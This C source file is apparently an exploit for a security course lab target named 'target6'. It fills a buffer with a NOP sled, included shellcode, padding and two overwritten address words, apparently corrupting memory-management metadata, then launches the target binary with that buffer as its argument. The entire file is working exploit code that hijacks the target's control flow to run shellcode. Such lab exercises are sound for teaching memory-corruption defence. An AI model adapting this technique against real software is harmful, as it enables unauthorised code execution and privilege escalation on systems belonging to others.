#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target6"

int main(void)
{
	char *args[3];
	char *env[1];
	char attackBuffer[192];

	*(int *)&attackBuffer[0] = 0x90909090;
	*(int *)&attackBuffer[4] = 0x90909090;

	memcpy(&attackBuffer[8], shellcode, 45);
	int i;
        for (i = 0; i < 19; i ++){
		memcpy(&attackBuffer[53+i], " ", 1);	
	}
	
	*(int *)&attackBuffer[72] = 0x0104ee28;
	*(int *)&attackBuffer[76] = 0x3050fe68;
	
	attackBuffer[80] = NULL;
	

	*(char *)&attackBuffer[4] = 0x77;














	args[0] = TARGET;
	args[1] = attackBuffer;
	args[2] = NULL;

	env[0] = NULL;

	if (0 > execve(TARGET, args, env))
		fprintf(stderr, "execve failed.\n");

	return 0;
}
